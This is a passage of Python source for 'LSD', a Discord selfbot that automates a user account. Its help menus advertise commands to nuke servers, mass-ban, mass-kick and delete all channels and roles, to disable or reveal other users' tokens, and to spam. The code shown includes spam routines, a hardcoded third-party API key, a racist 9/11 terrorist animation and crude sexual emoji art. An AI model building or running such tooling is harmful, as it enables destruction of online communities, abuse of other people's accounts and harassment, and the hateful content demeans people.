        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)


@LSD.command()
async def bots(ctx):
    await ctx.message.delete()
    bots = []
    for member in ctx.guild.members:
        if member.bot:
            bots.append(
                str(member.name).replace("`", "\`").replace("*", "\*").replace("_", "\_") + "#" + member.discriminator)
    bottiez = f"**Bots ({len(bots)}):**\n{', '.join(bots)}"
    await ctx.send(bottiez)


@LSD.command()
async def help(ctx, category=None):
    await ctx.message.delete()
    if category is None:
        embed = discord.Embed(color=0xFF0000, timestamp=ctx.message.created_at)
        embed.set_author(name="【﻿ＬＳＤ　ＳＥＬＦＢＯＴ】 | 𝙋𝙍𝙀𝙁𝙄𝙓: " + str(LSD.command_prefix),
                         icon_url=LSD.user.avatar_url)
        embed.set_thumbnail(url=LSD.user.avatar_url)
        embed.set_image(
            url="https://media.discordapp.net/attachments/809146921369075746/857070412273287228/fb91a413d982df03cc28e50f4a6a066f.gif")
        embed.add_field(name=":flag_white: `MALICIOUS`", value="Shows all malicious commands", inline=False)
        embed.add_field(name=":flag_white: `ANTI-NUKE`", value="Shows all anti-nuke commands", inline=False)
        embed.add_field(name=":flag_white: `GENERAL`", value="Shows all general commands", inline=False)
        embed.add_field(name=":flag_white: `ACCOUNT`", value="Shows all account commands", inline=False)
        embed.add_field(name=":flag_white: `TEXT`", value="Shows all text commands", inline=False)
        embed.add_field(name=":flag_white: `MUSIC`", value="Shows all music commands", inline=False)
        embed.add_field(name=":flag_white: `IMAGE`", value="Shows all image manipulation commands", inline=False)
        embed.add_field(name=":flag_white: `NSFW`", value="Shows all nsfw commands", inline=False)
        embed.add_field(name=":flag_white: `MISC`", value="Shows all miscellaneous commands", inline=False)
        embed.add_field(name=":flag_white: `NUKE`", value="Shows all nuke commands", inline=False)
        await ctx.send(embed=embed)
    elif str(category).lower() == "general":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(
            url="https://media.discordapp.net/attachments/809146921369075746/857070412273287228/fb91a413d982df03cc28e50f4a6a066f.gif")
        embed.description = f"\uD83D\uDCB0 `GENERAL COMMANDS`\n`> help <category>` - returns all commands of that category\n`> uptime` - return how long the selfbot has been running\n`> prefix <prefix>` - changes the bot's prefix\n`> ping` - returns the bot's latency\n`> av <user>` - returns the user's pfp\n`> whois <user>` - returns user's account info\n`> tokeninfo <token>` - returns information about the token\n`> copyserver` - makes a copy of the server\n`> rainbowrole <role>` - makes the role a rainbow role (ratelimits)\n`> serverinfo` - gets information about the server\n`> serverpfp` - returns the server's icon\n`> banner` - returns the server's banner\n`> shutdown` - shutsdown the selfbot\n`> getbans` - returns servers user bans\n`> warn` - warns given user with given reason\n"
        await ctx.send(embed=embed)
    elif str(category).lower() == "account":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(
            url="https://media.discordapp.net/attachments/809146921369075746/857070412273287228/fb91a413d982df03cc28e50f4a6a066f.gif")
        embed.description = f"\uD83D\uDCB0 `ACCOUNT COMMANDS`\n`> ghost` - makes your name and pfp invisible\n`> pfpsteal <user>` - steals the users pfp\n`> setpfp <link>` - sets the image-link as your pfp\n`> hypesquad <hypesquad>` - changes your current hypesquad\n`> spoofcon <type> <name>` - spoofs your discord connection\n`> leavegroups` - leaves all groups that you're in\n`> cyclenick <text>` - cycles through your nickname by letter\n`> stopcyclenick` - stops cycling your nickname\n`> stream <status>` - sets your streaming status\n`> playing <status>` - sets your playing status\n`> listening <status>` - sets your listening status\n`> watching <status>` - sets your watching status\n`> stopactivity` - resets your status-activity\n`> acceptfriends` - accepts all friend requests\n`> delfriends` - removes all your friends\n`> ignorefriends` - ignores all friends requests\n`> clearblocked` - clears your block-list\n`> read` - marks all messages as read\n`> leavegc` - leaves the current groupchat\n`> adminservers` - lists all servers you have perms in\n`> slotbot <on/off>` - snipes slotbots ({LSD.slotbot_sniper})\n`> giveaway <on/off>` - snipes giveaways ({LSD.giveaway_sniper})\n`> mee6 <on/off>` - auto sends messages in the specified channel ({LSD.mee6}) <#{LSD.mee6_channel}>\n`> yuikiss <user>` - auto sends yui kisses every minute <@{LSD.yui_kiss_user}> <#{LSD.yui_kiss_channel}>\n`> yuihug <user>` - auto sends yui hugs every minute <@{LSD.yui_hug_user}> <#{LSD.yui_hug_channel}>\n`> yuistop` - stops any running yui loops"
        await ctx.send(embed=embed)
    elif str(category).lower() == "text":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(
            url="https://media.discordapp.net/attachments/809146921369075746/857070412273287228/fb91a413d982df03cc28e50f4a6a066f.gif")
        embed.description = f"\uD83D\uDCB0 `TEXT COMMANDS`\n`> LSD` - sends the LSD logo\n`> snipe` - shows the last deleted message\n`> editsnipe` - shows the last edited message\n`> msgsniper <on/off> ({LSD.msgsniper})` - enables a message sniper for deleted messages in DMs\n`> clear` - sends a large message filled with invisible unicode\n`> del <message>` - sends a message and deletes it instantly\n`> 1337speak <message>` - talk like a hacker\n`> minesweeper` - play a game of minesweeper\n`> spam <amount>` - spams a message\n`> dm <user> <content>` - dms a user a message\n`> reverse <message>` - sends the message but in reverse-order\n`> shrug` - returns ¯\_(ツ)_/¯\n`> lenny` - returns ( ͡° ͜ʖ ͡°)\n`> fliptable` - returns (╯°□°）╯︵ ┻━┻\n`> unflip` - returns (╯°□°）╯︵ ┻━┻\n`> bold <message>` - bolds the message\n`> censor <message>` - censors the message\n`> underline <message>` - underlines the message\n`> italicize <message>` - italicizes the message\n`> strike <message>` - strikethroughs the message\n`> quote <message>` - quotes the message\n`> code <message>` - applies code formatting to the message\n`> purge <amount>` - purges the amount of messages\n`> empty` - sends an empty message\n`> tts <content>` - returns an mp4 file of your content\n`> firstmsg` - shows the first message in the channel history\n`> ascii <message>` - creates an ASCII art of your message\n`> wizz` - makes a prank message about wizzing \n`> 8ball <question>` - returns an 8ball answer\n`> slots` - play the slot machine\n`> everyone` - pings everyone through a link\n`> abc` - cyles through the alphabet\n`> 100` - cycles -100\n`> cum` - makes you cum lol?\n`> 9/11` - sends a 9/11 attack\n`> massreact <emoji>` - mass reacts with the specified emoji"
        await ctx.send(embed=embed)
    elif str(category).lower() == "music":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(
            url="https://media.discordapp.net/attachments/809146921369075746/857070412273287228/fb91a413d982df03cc28e50f4a6a066f.gif")
        embed.description = f"\uD83D\uDCB0 `MUSIC COMMANDS`\n`> play <query>` - plays the specified song if you're in a voice-channel\n`> stop` - stops the music player\n`> skip` - skips the current song playing\n`> lyrics <song>` - shows the specified song's lyrics\n`> youtube <query>` - returns the first youtube search result of the query"
        await ctx.send(embed=embed)
    elif str(category).lower() == "image":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(
            url="https://media.discordapp.net/attachments/809146921369075746/857070412273287228/fb91a413d982df03cc28e50f4a6a066f.gif")
        embed.description = f"\uD83D\uDCB0 `IMAGE MANIPULATION COMMANDS`\n`> tweet <user> <message>` makes a fake tweet\n`> magik <user>` - distorts the specified user\n`> fry <user>` - deep-fry the specified user\n`> blur <user>` - blurs the specified user\n`> pixelate <user>` - pixelates the specified user\n`> Supreme <message>` - makes a *Supreme* logo\n`> darksupreme <message>` - makes a *Dark Supreme* logo\n`> fax <text>` - makes a fax meme\n`> blurpify <user>` - blurpifies the specified user\n`> invert <user>` - inverts the specified user\n`> gay <user>` - makes the specified user gay\n`> communist <user>` - makes the specified user a communist\n`> snow <user>` - adds a snow filter to the specified user\n`> jpegify <user>` - jpegifies the specified user\n`> pornhub <logo-word 1> <logo-word 2>` - makes a PornHub logo\n`> phcomment <user> <message>` - makes a fake PornHub comment\n"
        await ctx.send(embed=embed)
    elif str(category).lower() == "nsfw":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(
            url="https://media.discordapp.net/attachments/809146921369075746/857070412273287228/fb91a413d982df03cc28e50f4a6a066f.gif")
        embed.description = f"\uD83D\uDCB0 `NSFW COMMANDS`\n`> anal` - returns anal pics\n`> erofeet` - returns erofeet pics\n`> feet` - returns sexy feet pics\n`> hentai` - returns hentai pics\n`> boobs` - returns booby pics\n`> tits` - returns titty pics\n`> blowjob` - returns blowjob pics\n`> neko` - returns neko pics\n`> lesbian` - returns lesbian pics\n`> cumslut` - returns cumslut pics\n`> pussy` - returns pussy pics\n`> waifu` - returns waifu pics"
        await ctx.send(embed=embed)
    elif str(category).lower() == "misc":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(
            url="https://media.discordapp.net/attachments/809146921369075746/857070412273287228/fb91a413d982df03cc28e50f4a6a066f.gif")
        embed.description = f"\uD83D\uDCB0 `MISCELLANEOUS COMMANDS`\n`> copycat <user>` - copies the users messages ({LSD.copycat})\n`> stopcopycat` - stops copycatting\n`> fakename` - makes a fakename with other members's names\n`> geoip <ip>` - looks up the ip's location\n`> pingweb <website-url>` pings a website to see if it's up\n`> anticatfish <user>` - reverse google searches the user's pfp\n`> stealemoji` - <emoji> <name> - steals the specified emoji\n`> hexcolor <hex-code>` - returns the color of the hex-code\n`> dick <user>` - returns the user's dick size\n`> bitcoin` - shows the current bitcoin exchange rate\n`> hastebin <message>` - posts your message to hastebin\n`> rolecolor <role>` - returns the role's color\n`> nitro` - generates a random nitro code\n`> feed <user>` - feeds the user\n`> tickle <user>` - tickles the user\n`> slap <user>` - slaps the user\n`> hug <user>` - hugs the user\n`> cuddle <user>` - cuddles the user\n`> smug <user>` - smugs at the user\n`> pat <user>` - pat the user\n`> kiss <user>` - kiss the user\n`> topic` - sends a conversation starter\n`> wyr` - sends a would you rather\n`> gif <query>` - sends a gif based on the query\n`> sendall <message>` - sends a message in every channel\n`> poll <msg: xyz 1: xyz 2: xyz>` - creates a poll\n`> bots` - shows all bots in the server\n`> image <query>` - returns an image\n`> hack <user>` - hacks the user\n`> token <user>` - returns the user's token\n`> cat` - returns random cat pic\n`> sadcat` - returns a random sad cat\n`> dog` - returns random dog pic\n`> fox` - returns random fox pic\n`> bird` - returns random bird pic\n`> virus` - trolls users with fake injected virus\n`> flop` - just a fun flop command :)\n"
        await ctx.send(embed=embed)
    elif str(category).lower() == "antinuke":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(
            url="https://media.discordapp.net/attachments/809146921369075746/857070412273287228/fb91a413d982df03cc28e50f4a6a066f.gif")
        embed.description = f"\uD83D\uDCB0 `ANTI-NUKE COMMANDS`\n`> antiraid <on/off>` - toggles anti-nuke ({LSD.antiraid})\n`> whitelist <user>` - whitelists the specified user\n**NOTE** Whitelisting a user will completely exclude them from anti-nuke detections, be weary on who you whitelist.\n`> whitelisted <-g>` - see who's whitleisted and in what guild\n`> unwhitelist <user>` - unwhitelists the user\n`> clearwhitelist` - clears the whitelist hash"
        await ctx.send(embed=embed)
    elif str(category).lower() == "nuke":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(
            url="https://media.discordapp.net/attachments/809146921369075746/857070412273287228/fb91a413d982df03cc28e50f4a6a066f.gif")
        embed.description = f"\uD83D\uDCB0 `NUKE COMMANDS`\n`> tokenfuck <token>` - disables the token\n`> nuke` - nukes the server\n`> massban` - bans everyone in the server\n`> dynoban` - mass bans with dyno one message at a time\n`> masskick` - kicks everyone in the server\n`> spamroles` - spam makes 250 roles\n`> spamchannels` - spam makes 250 text channels\n`> delchannels` - deletes all channels in the server\n`> delroles` - deletes all roles in the server\n`> purgebans` - unbans everyone\n`> renamechannels <name>` - renames all channels\n`> servername <name>` - renames the server to the specified name\n`> nickall <name>` - sets all user's nicknames to the specified name\n`> changeregion <amount>` - spam changes regions in groupchats\n`> kickgc` - kicks everyone in the gc\n`> spamgcname` - spam changes the groupchat name\n`> massmention <message>` - mass mentions random people"
        await ctx.send(embed=embed)


# GENERAL

# ACCOUNT

# TEXT

# MUSIC


# NSFW

# MISC

# ANTINUKE

# NUKE


@LSD.command(aliases=["giphy", "tenor", "searchgif"])
async def gif(ctx, query=None):
    await ctx.message.delete()
    if query is None:
        r = requests.get("https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R")
        res = r.json()
        await ctx.send(res['data']['url'])

    else:
        r = requests.get(
            f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en")
        res = r.json()
        await ctx.send(res['data'][0]["url"])


@LSD.command(aliases=["img", "searchimg", "searchimage", "imagesearch", "imgsearch"])
async def image(ctx, *, args):
    await ctx.message.delete()
    url = 'https://unsplash.com/search/photos/' + args.replace(" ", "%20")
    page = requests.get(url)
    soup = bs4(page.text, 'html.parser')
    image_tags = soup.findAll('img')
    if str(image_tags[2]['src']).find("https://trkn.us/pixel/imp/c="):
        link = image_tags[2]['src']
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(link) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(f"Search result for: **{args}**", file=discord.File(file, f"LSD_anal.png"))
        except:
            await ctx.send(f'' + link + f"\nSearch result for: **{args}** ")
    else:
        await ctx.send("Nothing found for **" + args + "**")


@LSD.command(aliases=["addemoji", "stealemote", "addemote"])
async def stealemoji(ctx):
    await ctx.message.delete()
    custom_regex = "<(?P<animated>a?):(?P<name>[a-zA-Z0-9_]{2,32}):(?P<id>[0-9]{18,22})>"
    unicode_regex = "(?:\U0001f1e6[\U0001f1e8-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f2\U0001f1f4\U0001f1f6-\U0001f1fa\U0001f1fc\U0001f1fd\U0001f1ff])|(?:\U0001f1e7[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ef\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1e8[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ee\U0001f1f0-\U0001f1f5\U0001f1f7\U0001f1fa-\U0001f1ff])|(?:\U0001f1e9[\U0001f1ea\U0001f1ec\U0001f1ef\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1ff])|(?:\U0001f1ea[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ed\U0001f1f7-\U0001f1fa])|(?:\U0001f1eb[\U0001f1ee-\U0001f1f0\U0001f1f2\U0001f1f4\U0001f1f7])|(?:\U0001f1ec[\U0001f1e6\U0001f1e7\U0001f1e9-\U0001f1ee\U0001f1f1-\U0001f1f3\U0001f1f5-\U0001f1fa\U0001f1fc\U0001f1fe])|(?:\U0001f1ed[\U0001f1f0\U0001f1f2\U0001f1f3\U0001f1f7\U0001f1f9\U0001f1fa])|(?:\U0001f1ee[\U0001f1e8-\U0001f1ea\U0001f1f1-\U0001f1f4\U0001f1f6-\U0001f1f9])|(?:\U0001f1ef[\U0001f1ea\U0001f1f2\U0001f1f4\U0001f1f5])|(?:\U0001f1f0[\U0001f1ea\U0001f1ec-\U0001f1ee\U0001f1f2\U0001f1f3\U0001f1f5\U0001f1f7\U0001f1fc\U0001f1fe\U0001f1ff])|(?:\U0001f1f1[\U0001f1e6-\U0001f1e8\U0001f1ee\U0001f1f0\U0001f1f7-\U0001f1fb\U0001f1fe])|(?:\U0001f1f2[\U0001f1e6\U0001f1e8-\U0001f1ed\U0001f1f0-\U0001f1ff])|(?:\U0001f1f3[\U0001f1e6\U0001f1e8\U0001f1ea-\U0001f1ec\U0001f1ee\U0001f1f1\U0001f1f4\U0001f1f5\U0001f1f7\U0001f1fa\U0001f1ff])|\U0001f1f4\U0001f1f2|(?:\U0001f1f4[\U0001f1f2])|(?:\U0001f1f5[\U0001f1e6\U0001f1ea-\U0001f1ed\U0001f1f0-\U0001f1f3\U0001f1f7-\U0001f1f9\U0001f1fc\U0001f1fe])|\U0001f1f6\U0001f1e6|(?:\U0001f1f6[\U0001f1e6])|(?:\U0001f1f7[\U0001f1ea\U0001f1f4\U0001f1f8\U0001f1fa\U0001f1fc])|(?:\U0001f1f8[\U0001f1e6-\U0001f1ea\U0001f1ec-\U0001f1f4\U0001f1f7-\U0001f1f9\U0001f1fb\U0001f1fd-\U0001f1ff])|(?:\U0001f1f9[\U0001f1e6\U0001f1e8\U0001f1e9\U0001f1eb-\U0001f1ed\U0001f1ef-\U0001f1f4\U0001f1f7\U0001f1f9\U0001f1fb\U0001f1fc\U0001f1ff])|(?:\U0001f1fa[\U0001f1e6\U0001f1ec\U0001f1f2\U0001f1f8\U0001f1fe\U0001f1ff])|(?:\U0001f1fb[\U0001f1e6\U0001f1e8\U0001f1ea\U0001f1ec\U0001f1ee\U0001f1f3\U0001f1fa])|(?:\U0001f1fc[\U0001f1eb\U0001f1f8])|\U0001f1fd\U0001f1f0|(?:\U0001f1fd[\U0001f1f0])|(?:\U0001f1fe[\U0001f1ea\U0001f1f9])|(?:\U0001f1ff[\U0001f1e6\U0001f1f2\U0001f1fc])|(?:\U0001f3f3\ufe0f\u200d\U0001f308)|(?:\U0001f441\u200d\U0001f5e8)|(?:[\U0001f468\U0001f469]\u200d\u2764\ufe0f\u200d(?:\U0001f48b\u200d)?[\U0001f468\U0001f469])|(?:(?:(?:\U0001f468\u200d[\U0001f468\U0001f469])|(?:\U0001f469\u200d\U0001f469))(?:(?:\u200d\U0001f467(?:\u200d[\U0001f467\U0001f466])?)|(?:\u200d\U0001f466\u200d\U0001f466)))|(?:(?:(?:\U0001f468\u200d\U0001f468)|(?:\U0001f469\u200d\U0001f469))\u200d\U0001f466)|[\u2194-\u2199]|[\u23e9-\u23f3]|[\u23f8-\u23fa]|[\u25fb-\u25fe]|[\u2600-\u2604]|[\u2638-\u263a]|[\u2648-\u2653]|[\u2692-\u2694]|[\u26f0-\u26f5]|[\u26f7-\u26fa]|[\u2708-\u270d]|[\u2753-\u2755]|[\u2795-\u2797]|[\u2b05-\u2b07]|[\U0001f191-\U0001f19a]|[\U0001f1e6-\U0001f1ff]|[\U0001f232-\U0001f23a]|[\U0001f300-\U0001f321]|[\U0001f324-\U0001f393]|[\U0001f399-\U0001f39b]|[\U0001f39e-\U0001f3f0]|[\U0001f3f3-\U0001f3f5]|[\U0001f3f7-\U0001f3fa]|[\U0001f400-\U0001f4fd]|[\U0001f4ff-\U0001f53d]|[\U0001f549-\U0001f54e]|[\U0001f550-\U0001f567]|[\U0001f573-\U0001f57a]|[\U0001f58a-\U0001f58d]|[\U0001f5c2-\U0001f5c4]|[\U0001f5d1-\U0001f5d3]|[\U0001f5dc-\U0001f5de]|[\U0001f5fa-\U0001f64f]|[\U0001f680-\U0001f6c5]|[\U0001f6cb-\U0001f6d2]|[\U0001f6e0-\U0001f6e5]|[\U0001f6f3-\U0001f6f6]|[\U0001f910-\U0001f91e]|[\U0001f920-\U0001f927]|[\U0001f933-\U0001f93a]|[\U0001f93c-\U0001f93e]|[\U0001f940-\U0001f945]|[\U0001f947-\U0001f94b]|[\U0001f950-\U0001f95e]|[\U0001f980-\U0001f991]|\u00a9|\u00ae|\u203c|\u2049|\u2122|\u2139|\u21a9|\u21aa|\u231a|\u231b|\u2328|\u23cf|\u24c2|\u25aa|\u25ab|\u25b6|\u25c0|\u260e|\u2611|\u2614|\u2615|\u2618|\u261d|\u2620|\u2622|\u2623|\u2626|\u262a|\u262e|\u262f|\u2660|\u2663|\u2665|\u2666|\u2668|\u267b|\u267f|\u2696|\u2697|\u2699|\u269b|\u269c|\u26a0|\u26a1|\u26aa|\u26ab|\u26b0|\u26b1|\u26bd|\u26be|\u26c4|\u26c5|\u26c8|\u26ce|\u26cf|\u26d1|\u26d3|\u26d4|\u26e9|\u26ea|\u26fd|\u2702|\u2705|\u270f|\u2712|\u2714|\u2716|\u271d|\u2721|\u2728|\u2733|\u2734|\u2744|\u2747|\u274c|\u274e|\u2757|\u2763|\u2764|\u27a1|\u27b0|\u27bf|\u2934|\u2935|\u2b1b|\u2b1c|\u2b50|\u2b55|\u3030|\u303d|\u3297|\u3299|\U0001f004|\U0001f0cf|\U0001f170|\U0001f171|\U0001f17e|\U0001f17f|\U0001f18e|\U0001f201|\U0001f202|\U0001f21a|\U0001f22f|\U0001f250|\U0001f251|\U0001f396|\U0001f397|\U0001f56f|\U0001f570|\U0001f587|\U0001f590|\U0001f595|\U0001f596|\U0001f5a4|\U0001f5a5|\U0001f5a8|\U0001f5b1|\U0001f5b2|\U0001f5bc|\U0001f5e1|\U0001f5e3|\U0001f5e8|\U0001f5ef|\U0001f5f3|\U0001f6e9|\U0001f6eb|\U0001f6ec|\U0001f6f0|\U0001f930|\U0001f9c0|[#|0-9]\u20e3"


@LSD.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
async def stopcopycat(ctx):
    await ctx.message.delete()
    if LSD.user is None:
        await ctx.send("You weren't copying anyone to begin with")
        return
    await ctx.send("Stopped copying " + str(LSD.copycat))
    LSD.copycat = None


@LSD.command(aliases=["copycatuser", "copyuser"])
async def copycat(ctx, user: discord.User):
    await ctx.message.delete()
    LSD.copycat = user
    await ctx.send("Now copying " + str(LSD.copycat))


@LSD.command(aliases=["9/11", "911", "terrorist"])
async def nine_eleven(ctx):
    await ctx.message.delete()
    invis = ""  # char(173)
    message = await ctx.send(f'''
{invis}:man_wearing_turban::airplane:    :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis} :man_wearing_turban::airplane:   :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}  :man_wearing_turban::airplane:  :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}   :man_wearing_turban::airplane: :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}    :man_wearing_turban::airplane::office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
        :boom::boom::boom:    
        ''')


@LSD.command(aliases=["jerkoff", "ejaculate", "orgasm"])
async def cum(ctx):
    await ctx.message.delete()
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')


@LSD.command()
async def clear(ctx):
    await ctx.message.delete()
    await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')


@LSD.command()
async def sendall(ctx, *, message):
    await ctx.message.delete()
    try:
        channels = ctx.guild.text_channels
        for channel in channels:
            await channel.send(message)
    except:
        pass


@LSD.command(aliases=["spamchangegcname", "changegcname"])
async def spamgcname(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        watermark = "LSD LOL"
        name = ""
        for letter in watermark:
            name = name + letter
            await ctx.message.channel.edit(name=name)


@LSD.command(aliases=["fakename"])
async def genname(ctx):
    await ctx.message.delete()
    first, second = random.choices(ctx.guild.members, k=2)
    first = first.display_name[len(first.display_name) // 2:]
    second = second.display_name[:len(second.display_name) // 2]
    await ctx.send(discord.utils.escape_mentions(second + first))


@LSD.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'Type', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'Hostname', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)


@LSD.command()
async def pingweb(ctx, website=None):
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        if r == 404:
            await ctx.send(f'Website is down ({r})', delete_after=3)
        else:
            await ctx.send(f'Website is operational ({r})', delete_after=3)


@LSD.command()
async def tweet(ctx, username: str = None, *, message: str = None):
    await ctx.message.delete()
    if username is None or message is None:
        await ctx.send("missing parameters")
        return
    async with aiohttp.LSDSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            try:
                async with aiohttp.LSDSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"LSD_tweet.png"))
            except:
                await ctx.send(res['message'])


@LSD.command(aliases=["distort"])
async def magik(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=magik&intensity=3&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_magik.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_magik.png"))
        except:
            await ctx.send(res['message'])


@LSD.command(aliases=['markasread', 'ack'])
async def read(ctx):
    await ctx.message.delete()
    for guild in LSD.guilds:
        await guild.ack()


@LSD.command(aliases=["deepfry"])
async def fry(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://nekobot.xyz/api/imagegen?type=deepfry&image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_fry.png"))
        except:
            await ctx.send(res['message'])
    else:
        avatar = str(user.avatar_url_as(format="png"))
        endpoint += avatar
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(str(res['message'])) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"LSD_fry.png"))
        except:
            await ctx.send(res['message'])


@LSD.command()
async def blur(ctx, user: discord.Member = None):
    await ctx.message.delete()
    endpoint = "https://api.alexflipnote.dev/filter/blur?image="
    if user is None:
        avatar = str(ctx.author.avatar_url_as(format="png"))
        endpoint += avatar
        try:
            async with aiohttp.LSDSession() as session:
                async with session.get(endpoint) as resp:
                    image = await resp.read()
